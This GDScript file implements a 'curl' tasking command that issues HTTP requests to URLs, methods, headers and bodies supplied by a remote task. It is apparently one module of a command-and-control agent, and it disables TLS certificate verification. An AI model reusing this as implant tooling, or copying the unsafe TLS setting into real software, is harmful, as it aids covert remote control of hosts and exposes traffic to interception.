extends Node

const CurlHTTPClient = preload("res://command/curl_httpclient.gd")

func _on_tasking_curl(transport, task):
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var url = parameters.get("url")
	var method = parameters.get("method")
	var body = PackedByteArray()
	var headers = PackedStringArray()

	if parameters.get("body") != null:
		body = Marshalls.base64_to_raw(parameters.get("body"))

	match method:
		"DELETE":
			method = HTTPClient.METHOD_DELETE
		"GET":
			method = HTTPClient.METHOD_GET
		"HEAD":
			method = HTTPClient.METHOD_HEAD
		"POST":
			method = HTTPClient.METHOD_POST
		"PUT":
			method = HTTPClient.METHOD_PUT
		_:
			method = HTTPClient.METHOD_GET

	for header in parameters.get("headers"):
		headers.append(header)

	# Create an HTTP request node and connect its completion signal.
	var http_request = CurlHTTPClient.new(transport, $".".get_parent().get_node("transfer"), task.get("id"), url)
	http_request.set_tls_options(TLSOptions.client_unsafe())
	http_request.set_use_threads(true)

	add_child(http_request) # get the _process loop going

	http_request.request_completed.connect(http_request.http_request_completed) # make sure we get the response

	var error = http_request.request_raw(url, headers, method, body)
	if error != OK:
		transport.send(
			transport.create_task_response(
				false,
				true,
				task.get("id"),
				"Failed to request %s due to error code %d" % [url, error]
			)
		)
